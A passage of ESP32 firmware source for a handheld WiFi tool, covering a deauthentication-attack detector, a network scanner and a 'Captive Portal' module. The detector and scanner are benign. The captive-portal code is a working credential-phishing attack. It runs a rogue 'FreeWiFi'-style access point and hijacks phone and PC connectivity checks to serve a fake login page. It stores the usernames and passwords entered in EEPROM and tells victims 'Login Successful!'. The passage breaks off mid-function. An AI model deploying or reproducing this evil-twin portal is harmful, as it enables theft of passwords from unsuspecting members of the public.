      displayPrint("[!!!] HIGH DEAUTH ATTACK on " + ssidLists[i] + " (" + String(deauth[i]) + " attacks)", TFT_RED, true);
      xSemaphoreGive(tftSemaphore);
    }
  }
}

void scanWiFiTask(void *param) {
  while (1) {
    checkButtonPress();
    if (exitMode) {
      vTaskDelay(10 / portTICK_PERIOD_MS);
      break;
    }
    if (stopScan) {
      vTaskDelay(10 / portTICK_PERIOD_MS);
      continue;
    }

    xSemaphoreTake(tftSemaphore, portMAX_DELAY);
    displayPrint("[*] Scanning WiFi networks", TFT_CYAN, true);
    xSemaphoreGive(tftSemaphore);

    int n = WiFi.scanNetworks();
    if (exitMode) {
      vTaskDelay(10 / portTICK_PERIOD_MS);
      break;
    }
    if (stopScan) {
      vTaskDelay(10 / portTICK_PERIOD_MS);
      continue;
    }

    for (int i = 0; i < n && i < MAX_NETWORKS; i++) {
      String fullSSID = WiFi.SSID(i);
      ssidLists[i] = fullSSID.substring(0, MAX_SSID_LENGTH);
      const uint8_t *bssid = WiFi.BSSID(i);
      memcpy(macList[i], bssid, 6);

      xSemaphoreTake(tftSemaphore, portMAX_DELAY);
      displayPrint("[+] " + ssidLists[i] + (fullSSID.length() > MAX_SSID_LENGTH ? "..." : "") +
                   " | CH: " + String(WiFi.channel(i)) +
                   " | RSSI: " + String(WiFi.RSSI(i)), TFT_WHITE);
      xSemaphoreGive(tftSemaphore);

      if (exitMode) {
        vTaskDelay(10 / portTICK_PERIOD_MS);
        break;
      }
      if (stopScan) {
        vTaskDelay(10 / portTICK_PERIOD_MS);
        break;
      }
    }
    analyzeNetworks(n);
    vTaskDelay(5000 / portTICK_PERIOD_MS);
  }
  wifiScanTaskHandle = NULL;
  vTaskDelete(NULL);
}

static bool uiDrawn = false;

void runUI() {   
  
    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
    
    static const unsigned char* icons[ICON_NUM] = {
        bitmap_icon_start,  // Icon 0: Stop scan
        bitmap_icon_go_back // Added back icon
    };

    // Redraw UI elements when entering mode
    if (!uiDrawn) {
        tft.setTextFont(1);
        tft.fillRect(0, 20, 140, 16, DARK_GRAY);
        tft.setTextColor(TFT_WHITE);
        tft.setTextSize(1);
        tft.setCursor(35, 24);
        tft.print("Scanning WiFi");

        tft.drawLine(0, 19, 240, 19, TFT_WHITE);
        tft.fillRect(140, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH - 140, STATUS_BAR_HEIGHT, DARK_GRAY);
        
        for (int i = 0; i < ICON_NUM; i++) {
            if (icons[i] != NULL) {  
                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
            } 
        }
        tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
        uiDrawn = true;
    }

    // Non-blocking animation state machine
    static unsigned long lastAnimationTime = 0;
    static int animationState = 0;  // 0: idle, 1: black, 2: white
    static int activeIcon = -1;

    if (animationState > 0 && millis() - lastAnimationTime >= 150) {
        if (animationState == 1) {
            tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
            animationState = 2;

            // Execute action after animation
            switch (activeIcon) {
                case 0:
                    displayPrint("[!] Scanning Stopped", TFT_RED, true);
                    displayPrint("[!] Press [Select] to Exit", TFT_RED, false);
                    stopScan = true;
                    animationState = 0;
                    activeIcon = -1;
                    break;
                    
                case 1: // Back icon action (exit to submenu)   
                    displayPrint("[!] Scanning Stopped", TFT_RED, true);  
                    stopScan = true;      
                    feature_exit_requested = true;
                    animationState = 0;
                    activeIcon = -1;
                    break;            
            }
        } else if (animationState == 2) {
            animationState = 0;
            activeIcon = -1;
        }
        lastAnimationTime = millis();
    }

    // Throttle touchscreen polling
    static unsigned long lastTouchCheck = 0;
    const unsigned long touchCheckInterval = 50;  // Check every 50ms

    if (millis() - lastTouchCheck >= touchCheckInterval) {
        if (ts.touched() && feature_active) {
            TS_Point p = ts.getPoint();
            int x = ::map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
            int y = ::map(p.y, 3800, 300, 0, SCREENHEIGHT - 1);

            if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
                for (int i = 0; i < ICON_NUM; i++) {
                    if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
                        if (icons[i] != NULL && animationState == 0) {
                            tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                            animationState = 1;
                            activeIcon = i;
                            lastAnimationTime = millis();
                        }
                        break;
                    }
                }
            }
        }
        lastTouchCheck = millis();
    }
}

void uiTask(void *param) {
  while (1) {
    xSemaphoreTake(tftSemaphore, portMAX_DELAY);
    runUI();
    xSemaphoreGive(tftSemaphore);
    vTaskDelay(50 / portTICK_PERIOD_MS);
  }
}

void statusBarTask(void *param) {
  while (1) {
    xSemaphoreTake(tftSemaphore, portMAX_DELAY);
    updateStatusBar();
    xSemaphoreGive(tftSemaphore);
    vTaskDelay(1000 / portTICK_PERIOD_MS);
  }
}

void deauthdetectSetup() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(snifferCallback);

  tft.fillScreen(TFT_BLACK);

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, false);

  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);

  setupTouchscreen();

  tftSemaphore = xSemaphoreCreateMutex();

  xTaskCreate(scanWiFiTask, "WiFiScanTask", 4096, NULL, 1, &wifiScanTaskHandle);
  xTaskCreate(uiTask, "UITask", 4096, NULL, 2, &uiTaskHandle);
  xTaskCreate(statusBarTask, "StatusBarTask", 2048, NULL, 1, &statusBarTaskHandle);

   uiDrawn = false;
}

void deauthdetectLoop() {
  checkButtonPress();

  if (stopScan || exitMode) {
    vTaskDelete(wifiScanTaskHandle);
    wifiScanTaskHandle = NULL;
    vTaskDelete(uiTaskHandle);
    uiTaskHandle = NULL;
    vTaskDelete(statusBarTaskHandle);
    esp_wifi_set_promiscuous(false);
    WiFi.disconnect();
    stopScan = false;
    exitMode = false;
    lineIndex = 0;
    delay(10);
   }
 }
}


/*
   WifiScan


*/

namespace WifiScan {

#define TFT_WIDTH 240
#define TFT_HEIGHT 320

#define BTN_UP 6
#define BTN_DOWN 3
#define BTN_RIGHT 5
#define BTN_LEFT 4

#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 2

int currentIndex = 0;
int listStartIndex = 0;
bool isDetailView = false;
bool isScanning = false;
bool exitRequested = false;

unsigned long scan_StartTime = 0;
const unsigned long scanTimeout = 2000;
unsigned long lastButtonPress = 0;
const unsigned long debounceTime = 200;

#define MAX_SSID_LENGTH 10
#define LIST_TOP (STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT + 15)
#define LIST_ITEM_HEIGHT 18
#define MAX_VISIBLE_ITEMS 14

static bool uiDrawn = false;

static int iconX[ICON_NUM] = {210, 10};
static const unsigned char* icons[ICON_NUM] = {
  bitmap_icon_undo,
  bitmap_icon_go_back // Added back icon
};

void displayWiFiList(bool fullRedraw = false) {
  uiDrawn = false;
  int networkCount = WiFi.scanComplete();

  if (fullRedraw || networkCount <= 0) {
    tft.fillRect(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, TFT_WIDTH, TFT_HEIGHT - (STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT), TFT_BLACK);

    tft.fillRect(0, 20, 140, 16, DARK_GRAY);
    tft.setTextColor(TFT_WHITE);
    tft.setCursor(35, 24);
    tft.print("WiFi Networks:");

    if (networkCount <= 0) {
      tft.fillRect(0, 20, 140, 16, DARK_GRAY);
      tft.setTextColor(TFT_WHITE);
      tft.setCursor(5, 24);
      tft.print("No Networks Found");
      return;
    }

    tft.setTextColor(TFT_WHITE, TFT_BLACK);

    for (int i = 0; i < MAX_VISIBLE_ITEMS; i++) {
      int currentNetworkIndex = i + listStartIndex;
      if (currentNetworkIndex >= networkCount) break;

      String fullSSID = WiFi.SSID(currentNetworkIndex);
      String ssid = fullSSID.substring(0, MAX_SSID_LENGTH);
      int rssi = WiFi.RSSI(currentNetworkIndex);
      int yPos = LIST_TOP + i * LIST_ITEM_HEIGHT;

      if (currentNetworkIndex == currentIndex) {
        tft.setTextColor(ORANGE, TFT_BLACK);
        tft.setCursor(10, yPos);
        tft.print("> ");
      } else {
        tft.setTextColor(TFT_WHITE, TFT_BLACK);
        tft.setCursor(10, yPos);
        tft.print("  ");
      }

      tft.setCursor(25, yPos);
      tft.print(ssid);
      if (fullSSID.length() > MAX_SSID_LENGTH) tft.print("...");
      tft.print(" | RSSI: ");
      tft.print(rssi);
    }
  } else {
    for (int i = 0; i < MAX_VISIBLE_ITEMS; i++) {
      int currentNetworkIndex = i + listStartIndex;
      if (currentNetworkIndex >= networkCount) break;

      if (currentNetworkIndex == currentIndex || currentNetworkIndex == currentIndex + 1 || currentNetworkIndex == currentIndex - 1) {
        String fullSSID = WiFi.SSID(currentNetworkIndex);
        String ssid = fullSSID.substring(0, MAX_SSID_LENGTH);
        int rssi = WiFi.RSSI(currentNetworkIndex);
        int yPos = LIST_TOP + i * LIST_ITEM_HEIGHT;

        tft.fillRect(0, yPos - 2, TFT_WIDTH, LIST_ITEM_HEIGHT, TFT_BLACK);

        if (currentNetworkIndex == currentIndex) {
          tft.setTextColor(ORANGE, TFT_BLACK);
          tft.setCursor(10, yPos);
          tft.print("> ");
        } else {
          tft.setTextColor(TFT_WHITE, TFT_BLACK);
          tft.setCursor(10, yPos);
          tft.print("  ");
        }

        tft.setCursor(25, yPos);
        tft.print(ssid);
        if (fullSSID.length() > MAX_SSID_LENGTH) tft.print("...");
        tft.print(" | RSSI: ");
        tft.print(rssi);
      }
    }
  }
}

void displayScanning() {
  uiDrawn = false;
  tft.fillRect(0, 20, 140, 16, DARK_GRAY);
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);

  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, STATUS_BAR_Y_OFFSET + 25);
  tft.print("[*] Scanning");

  for (int i = 0; i < 2; i++) {
    for (int j = 0; j <= i; j++) {
      tft.print(".");
      delay(500);
    }
  }

  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, STATUS_BAR_Y_OFFSET + 35);
  tft.print("[+] Scan complete!");

  delay(100);
  
  tft.setCursor(10, STATUS_BAR_Y_OFFSET + 55);
  tft.print("[+] Wait a moment");
  isScanning = false;
}

void startWiFiScan() {
  displayScanning();

  scan_StartTime = millis();
  isScanning = true;
  exitRequested = false;

  int numNetworks = WiFi.scanNetworks(false, true);

  isScanning = false;
  displayWiFiList(true);
}

void displayWiFiDetails() {
  uiDrawn = false;
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);

  String ssid = WiFi.SSID(currentIndex);
  String bssid = WiFi.BSSIDstr(currentIndex);
  int rssi = WiFi.RSSI(currentIndex);
  int channel = WiFi.channel(currentIndex);
  int encryption = WiFi.encryptionType(currentIndex);
  bool isHidden = (ssid.length() == 0);
  int y_shift = 0;

  float signalQuality = constrain(2 * (rssi + 100), 0, 100);
  float estimatedDistance = pow(10.0, (-69.0 - rssi) / (10.0 * 2.0));

  String encryptionType;
  switch (encryption) {
    case WIFI_AUTH_OPEN: encryptionType = "Open"; break;
    case WIFI_AUTH_WEP: encryptionType = "WEP"; break;
    case WIFI_AUTH_WPA_PSK: encryptionType = "WPA"; break;
    case WIFI_AUTH_WPA2_PSK: encryptionType = "WPA2"; break;
    case WIFI_AUTH_WPA_WPA2_PSK: encryptionType = "WPA/WPA2"; break;
    case WIFI_AUTH_WPA2_ENTERPRISE: encryptionType = "WPA2-Ent"; break;
    default: encryptionType = "Unknown"; break;
  }

  tft.fillRect(0, 20, 140, 16, DARK_GRAY);
  tft.setTextColor(TFT_WHITE);
  tft.setCursor(35, 24);
  tft.print("Network Details:");

  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);

  tft.setCursor(10, STATUS_BAR_Y_OFFSET + 35 + y_shift);
  tft.print("SSID: "); tft.print(isHidden ? "(Hidden)" : ssid);

  tft.setCursor(10, STATUS_BAR_Y_OFFSET + 55 + y_shift);
  tft.print("BSSID: "); tft.print(bssid);

  tft.setCursor(10, STATUS_BAR_Y_OFFSET + 75 + y_shift);
  tft.print("RSSI: "); tft.print(rssi); tft.print(" dBm");

  tft.setCursor(10, STATUS_BAR_Y_OFFSET + 95 + y_shift);
  tft.print("Signal: "); tft.print(signalQuality); tft.print("%");

  tft.setCursor(10, STATUS_BAR_Y_OFFSET + 115 + y_shift);
  tft.print("Channel: "); tft.print(channel);

  tft.setCursor(10, STATUS_BAR_Y_OFFSET + 135 + y_shift);
  tft.print("Encryption: "); tft.print(encryptionType);

  tft.setCursor(10, STATUS_BAR_Y_OFFSET + 155 + y_shift);
  tft.print("Est. Distance: "); tft.print(estimatedDistance, 1); tft.print("m");
}

void handleButton() {
  unsigned long currentMillis = millis();
  if (currentMillis - lastButtonPress < debounceTime) return;

  bool updated = false;

  if (!pcf.digitalRead(BTN_UP)) {
    if (!isDetailView && currentIndex > 0) {
      currentIndex--;
      delay(200);
      if (currentIndex < listStartIndex) listStartIndex--;
      updated = true;
    }
    lastButtonPress = currentMillis;
  }

  if (!pcf.digitalRead(BTN_DOWN)) {
    if (!isDetailView && currentIndex < WiFi.scanComplete() - 1) {
      currentIndex++;
      delay(200);
      if (currentIndex >= listStartIndex + MAX_VISIBLE_ITEMS) listStartIndex++;
      updated = true;
    }
    lastButtonPress = currentMillis;
  }

  if (!pcf.digitalRead(BTN_RIGHT)) {
    delay(200);
    if (!isScanning) {
      isDetailView = !isDetailView;
      updated = true;
    }
    lastButtonPress = currentMillis;
  }

  if (!pcf.digitalRead(BTN_LEFT)) {
    delay(200);
    if (isDetailView) {
      isDetailView = false;
    } else if (!isScanning) {
      startWiFiScan();
    }
    updated = true;
    lastButtonPress = currentMillis;
  }

  if (updated) {
    if (isDetailView) displayWiFiDetails();
    else displayWiFiList();
  }
}



void runUI() {

    static int iconY = STATUS_BAR_Y_OFFSET;
    
    if (!uiDrawn) {
        tft.drawLine(0, 19, 240, 19, TFT_WHITE);
        tft.fillRect(140, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH - 140, STATUS_BAR_HEIGHT, DARK_GRAY);
        
        for (int i = 0; i < ICON_NUM; i++) {
            if (icons[i] != NULL) {
                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
            }
        }
        tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
        uiDrawn = true;
    }

    static unsigned long lastAnimationTime = 0;
    static int animationState = 0;  
    static int activeIcon = -1;

    if (animationState > 0 && millis() - lastAnimationTime >= 150) {
        if (animationState == 1) {
            tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
            animationState = 2;

            switch (activeIcon) {
                case 0:
                    if (!isScanning) {
                        startWiFiScan();
                    }
                    break;
                case 1: // Back icon action (exit to submenu)
                    feature_exit_requested = true;
                    break;
            }
        } else if (animationState == 2) {
            animationState = 0;
            activeIcon = -1;
        }
        lastAnimationTime = millis();
    }

    static unsigned long lastTouchCheck = 0;
    const unsigned long touchCheckInterval = 50; 

    if (millis() - lastTouchCheck >= touchCheckInterval) {
        if (ts.touched() && feature_active) {
            TS_Point p = ts.getPoint();
            int x = ::map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
            int y = ::map(p.y, 3800, 300, 0, SCREENHEIGHT - 1);

            if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
                for (int i = 0; i < ICON_NUM; i++) {
                    if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
                        if (icons[i] != NULL && animationState == 0) {
                            tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                            animationState = 1;
                            activeIcon = i;
                            lastAnimationTime = millis();
                        }
                        break;
                    }
                }
            }
        }
        lastTouchCheck = millis();
    }
}

void wifiscanSetup() {
  
  tft.setRotation(0);
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);
  tft.fillRect(0, 20, 140, 16, DARK_GRAY);

  uiDrawn = false;

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, false);
  runUI();

  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);

  setupTouchscreen();

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  startWiFiScan();
}

void wifiscanLoop() {
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);
  static bool lastDetailView = false;
  static bool lastScanning = true;

  handleButton();
  updateStatusBar();
  runUI();
  //delay(10);

  if (isScanning) {
    if (!lastScanning) {
      displayScanning();
      lastScanning = true;
    }
  } else if (!isDetailView) {
    if (lastDetailView || lastScanning) {
      displayWiFiList(true);
    }
    lastDetailView = false;
    lastScanning = false;
  } else {
    if (!lastDetailView) {
      displayWiFiDetails();
    }
    lastDetailView = true;
    }
  }
}



/*
 * 
 * 
 * Captive Portal
 * 
 * 
*/

namespace CaptivePortal {

const char* default_ssid = "ESP32DIV_AP";
char custom_ssid[32] = "ESP32DIV_AP";
const char* password = NULL;
DNSServer dnsServer;
const byte DNS_PORT = 53;
WebServer server(80);
bool attackActive = true;

#define EEPROM_SIZE 1440
#define SSID_ADDR 0
#define CRED_ADDR 32
#define COUNT_ADDR 1248
#define MAX_CREDS 20
#define CRED_SIZE 64 // 16 (user) + 16 (pass) + 32 (SSID)

String terminalBuffer[MAX_LINES];
uint16_t colorBuffer[MAX_LINES];
int lineIndex = 0;

struct Credential {
  char username[16];
  char password[16];
  char ssid[32];
};

enum Screen { MAIN_MENU, KEYBOARD, CRED_LIST };
Screen currentScreen = MAIN_MENU;
int credPage = 0;

bool keyboardActive = false;
String inputSSID = "";
const int keyWidth = 22;
const int keyHeight = 18;
const int keySpacing = 2;
const char* keyboardLayout[] = {
  "1234567890",
  "qwertyuiop",
  "asdfghjkl ",
  "zxcvbnm_<-"
};
bool cursorState = false;
unsigned long lastCursorToggle = 0;

const char* seriesSSIDs[] = {"ESP32DIV_AP", "FreeWiFi", "Loading..."};
const int numSeriesSSIDs = 3;
int seriesSSIDIndex = 0;

String loginPage = R"(
<!DOCTYPE html>
<html>
<head>
  <title>Wi-Fi Login</title>
  <meta name='viewport' content='width=device-width, initial-scale=1'>
  <meta http-equiv='Cache-Control' content='no-cache, no-store, must-revalidate'>
  <meta http-equiv='Pragma' content='no-cache'>
  <meta http-equiv='Expires' content='0'>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background-color: #f0f0f0; }
    h1 { color: #333; }
    .container { max-width: 400px; margin: auto; padding: 20px; background: white; border-radius: 10px; }
    input { padding: 10px; margin: 10px 0; width: 100%; box-sizing: border-box; border: 1px solid #ccc; border-radius: 5px; }
    button { padding: 10px; background-color: #007BFF; color: white; border: none; border-radius: 5px; cursor: pointer; width: 100%; }
    button:hover { background-color: #0056b3; }
  </style>
</head>
<body>
  <div class='container'>
    <h1>Free Wi-Fi</h1>
    <p>Log in to connect.</p>
    <form action='/login' method='POST'>
      <input type='text' name='username' placeholder='Username' required><br>
      <input type='password' name='password' placeholder='Password' required><br>
      <button type='submit'>Log In</button>
    </form>
  </div>
</body>
</html>
)";

void scrollTerminal() {
  for (int i = 0; i < MAX_LINES - 1; i++) {
    terminalBuffer[i] = terminalBuffer[i + 1];
    colorBuffer[i] = colorBuffer[i + 1];
  }
}

void displayPrint(String text, uint16_t color, bool extraSpace = false) {
  if (lineIndex >= MAX_LINES - 1) {
    scrollTerminal();
    lineIndex = MAX_LINES - 1;
  }

  terminalBuffer[lineIndex] = text;
  colorBuffer[lineIndex] = color;
  lineIndex++;

  if (extraSpace && lineIndex < MAX_LINES) {
    terminalBuffer[lineIndex] = "";
    colorBuffer[lineIndex] = TFT_WHITE;
    lineIndex++;
  }

  for (int i = 0; i < lineIndex; i++) {
    int yPos = i * LINE_HEIGHT + 45;
    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
    tft.fillRect(5, yPos, tft.width() - 10, LINE_HEIGHT, TFT_BLACK);
    tft.setTextColor(colorBuffer[i], TFT_BLACK);
    tft.setCursor(5, yPos);
    tft.print(terminalBuffer[i]);
  }
}

void saveCredential(String username, String password, String ssid) {
  Credential cred;
  strncpy(cred.username, username.c_str(), 15);
  cred.username[15] = '\0';
  strncpy(cred.password, password.c_str(), 15);
  cred.password[15] = '\0';
  strncpy(cred.ssid, ssid.c_str(), 31);
  cred.ssid[31] = '\0';

  int count = EEPROM.read(COUNT_ADDR);
  Serial.printf("Before saving, credential count: %d\n", count);
  if (count < MAX_CREDS) {
    int addr = CRED_ADDR + (count * CRED_SIZE);
    EEPROM.put(addr, cred);
    count++;
    EEPROM.write(COUNT_ADDR, count);
    EEPROM.commit();
    Serial.println("Credential saved at address " + String(addr));
    Serial.println("Username: " + String(cred.username));
    Serial.println("Password: " + String(cred.password));
    Serial.println("SSID: " + String(cred.ssid));
    Serial.printf("After saving, credential count: %d\n", count);
  } else {
    Serial.println("Credential storage full");
  }
}

// WebServer handler functions
static void handleGenerate204() {
  Serial.println("Android /generate_204 requested");
  displayPrint("Android /generate_204 requested", GREEN, false);
  server.sendHeader("Location", "/login.html", true);
  server.send(302, "text/plain", "");
}

static void handleHotspotDetect() {
  Serial.println("iOS /hotspot-detect.html requested");
  displayPrint("iOS /hotspot-detect.html requested", GREEN, false);
  server.send(200, "text/html", loginPage);
}

static void handleCaptiveApple() {
  Serial.println("iOS /captive.apple.com requested");
  displayPrint("iOS /captive.apple.com requested", GREEN, false);
  server.send(200, "text/html", "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>");
}

static void handleNCSITxt() {
  Serial.println("Windows /ncsi.txt requested");
  displayPrint("Windows /ncsi.txt requested", GREEN, false);
  server.send(200, "text/plain", "Microsoft NCSI");
}

static void handleConnectTestTxt() {
  Serial.println("Windows /connecttest.txt requested");
  displayPrint("Windows /connecttest.txt requested", GREEN, false);
  server.send(200, "text/plain", "Microsoft Connect Test");
}

static void handleLoginPage() {
  Serial.println("Login page (/login.html) requested");
  displayPrint("Login page (/login.html) requested", GREEN, false);
  server.send(200, "text/html", loginPage);
}

static void handleRoot() {
  Serial.println("Root (/) requested");
  displayPrint("Root (/) requested", GREEN, false);
  server.send(200, "text/html", loginPage);
}

static void handleLoginPost() {
  String username = server.arg("username");
  String password = server.arg("password");
  Serial.println("Captured Credentials:");
  Serial.println("Username: " + username);
  Serial.println("Password: " + password);
  Serial.println("SSID: " + String(custom_ssid));
  saveCredential(username, password, custom_ssid);
  server.send(200, "text/html", "<h1>Login Successful!</h1><p>You are now connected.</p>");
}

static void handleNotFound() {
  Serial.println("Not found: " + server.uri());
  server.sendHeader("Location", "/login.html", true);
  server.send(302, "text/plain", "");
}


void setupWebServer() {
  server.on("/generate_204", HTTP_GET, static_cast<void (*)()>(handleGenerate204));
  server.on("/hotspot-detect.html", HTTP_GET, static_cast<void (*)()>(handleHotspotDetect));
  server.on("/captive.apple.com", HTTP_GET, static_cast<void (*)()>(handleCaptiveApple));
  server.on("/ncsi.txt", HTTP_GET, static_cast<void (*)()>(handleNCSITxt));
  server.on("/connecttest.txt", HTTP_GET, static_cast<void (*)()>(handleConnectTestTxt));
  server.on("/login.html", HTTP_GET, static_cast<void (*)()>(handleLoginPage));
  server.on("/", HTTP_GET, static_cast<void (*)()>(handleRoot));
  server.on("/login", HTTP_POST, static_cast<void (*)()>(handleLoginPost));
  server.onNotFound(static_cast<void (*)()>(handleNotFound));
}


void loadSSID() {
  String savedSSID = "";
  for (int i = 0; i < 32; i++) {
    char c = EEPROM.read(SSID_ADDR + i);
    if (c == 0) break;
    savedSSID += c;
  }
  if (savedSSID.length() > 0) {
    savedSSID.toCharArray(custom_ssid, 32);
  } else {
    strcpy(custom_ssid, default_ssid);
  }
}

void saveSSID(String ssid) {
  for (int i = 0; i < 32; i++) {
    if (i < ssid.length()) {
      EEPROM.write(SSID_ADDR + i, ssid[i]);
    } else {
      EEPROM.write(SSID_ADDR + i, 0);
    }
  }
  EEPROM.commit();
  ssid.toCharArray(custom_ssid, 32);
  if (attackActive) {
    WiFi.softAPdisconnect(true);
    WiFi.softAP(custom_ssid, password);
    Serial.println("New SSID set: " + String(custom_ssid));
  }
}

void deleteCredential(int index) {
  int count = EEPROM.read(COUNT_ADDR);
  if (index < 0 || index >= count) {
    Serial.println("Invalid credential index: " + String(index));
    return;
  }

  for (int i = index; i < count - 1; i++) {
    Credential cred;
    EEPROM.get(CRED_ADDR + ((i + 1) * CRED_SIZE), cred);
    EEPROM.put(CRED_ADDR + (i * CRED_SIZE), cred);
  }

  count--;
  EEPROM.write(COUNT_ADDR, count);
  EEPROM.commit();
  Serial.println("Credential deleted at index " + String(index));
  Serial.printf("New credential count: %d\n", count);
}

void clearAllCredentials() {
  EEPROM.put(COUNT_ADDR, (uint32_t)0);

  int endAddr = CRED_ADDR + (MAX_CREDS * CRED_SIZE); 
  if (endAddr > COUNT_ADDR) {
    Serial.println("Error: Credential clear would overwrite counter!");
    endAddr = COUNT_ADDR; 
  }
  for (int i = CRED_ADDR; i < endAddr; i++) {
    EEPROM.write(i, 0);
  }
  EEPROM.commit();
  Serial.println("All credentials cleared from " + String(CRED_ADDR) + " to " + String(endAddr - 1));
}

void drawMainMenu() {
  currentScreen = MAIN_MENU;

  tft.setTextSize(1);
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);

  displayPrint("Current SSID:", GREEN, false);
  displayPrint(custom_ssid, WHITE, false);
  displayPrint("...", GREEN, false);

  displayPrint(attackActive ? "Status: Active" : "Status: Inactive", GREEN, false);

}

void drawInputField() {
  tft.fillRect(10, 55, 220, 25, TFT_DARKGREY);
  tft.drawRect(9, 54, 222, 27, ORANGE);
  tft.setTextColor(TFT_WHITE);
  tft.setTextSize(2);
  tft.setCursor(15, 60);
  String displayText = inputSSID;
  if (cursorState && keyboardActive) {
    displayText += "|";
  }
  tft.println(displayText);
}

void drawKeyboard() {
  currentScreen = KEYBOARD;
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);

  tft.setTextColor(ORANGE);
  tft.setTextSize(1);
  tft.setCursor(1, 230);
  tft.println("[!] Set the SSID that your AP will use");
  tft.setCursor(20, 245);
  tft.println("to host the captive portal.");

  tft.setCursor(1, 270);
  tft.println("[!] Shuffle: Randomly generates SSID");
  tft.setCursor(20, 285);
  tft.println("suggestions for your access point.");

  drawInputField();

  int yOffset = 95;
  for (int row = 0; row < 4; row++) {
    int xOffset = 1;
    for (int col = 0; col < strlen(keyboardLayout[row]); col++) {
      tft.fillRect(xOffset, yOffset, keyWidth, keyHeight, TFT_DARKGREY);
      tft.setTextColor(TFT_WHITE);
      tft.setTextSize(1);
      tft.setCursor(xOffset + 6, yOffset + 5);
      tft.print(keyboardLayout[row][col]);
      Serial.printf("Key %c at x=%d-%d, y=%d-%d\n", keyboardLayout[row][col], xOffset, xOffset + keyWidth, yOffset, yOffset + keyHeight);
      xOffset += keyWidth + keySpacing;
    }
    yOffset += keyHeight + keySpacing;
  }

tft.setTextColor(ORANGE); 
tft.setTextSize(1); 
tft.setTextDatum(MC_DATUM); 

// Back Button
tft.fillRoundRect(5, 185, 70, 25, 4, DARK_GRAY); 
tft.drawRoundRect(5, 185, 70, 25, 4, ORANGE); 
tft.drawString("Back", 40, 197); 
Serial.printf("Back button at x=5-75, y=185-210\n");

// Series Button
tft.fillRoundRect(85, 185, 70, 25, 4, DARK_GRAY); 
tft.drawRoundRect(85, 185, 70, 25, 4, ORANGE); 
tft.drawString("Shuffle", 120, 197); 
Serial.printf("Series button at x=85-155, y=185-210\n");

// OK Button
tft.fillRoundRect(165, 185, 70, 25, 4, DARK_GRAY); 
tft.drawRoundRect(165, 185, 70, 25, 4, ORANGE); 
tft.drawString("OK", 200, 197); 
Serial.printf("OK button at x=165-235, y=185-210\n");
}

void drawCredList() {
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
  tft.setTextColor(TFT_WHITE);
  tft.setTextSize(1);
  tft.setCursor(0, 50);
  tft.println("Credentials List:");

  tft.setCursor(0, 70);
  tft.print("User");
  tft.setCursor(80, 70);
  tft.print("Pass");
  tft.setCursor(160, 70);
  tft.print("SSID");
  tft.drawLine(0, 80, 245, 80, TFT_WHITE);

  int count = EEPROM.read(COUNT_ADDR);
  Serial.printf("Reading %d credentials from EEPROM\n", count);

  int startIdx = credPage * 18;
  int yOffset = 90;

  if (count == 0) {
    tft.setCursor(0, yOffset);
    tft.println("No credentials");
    Serial.println("No credentials found");
  } else {
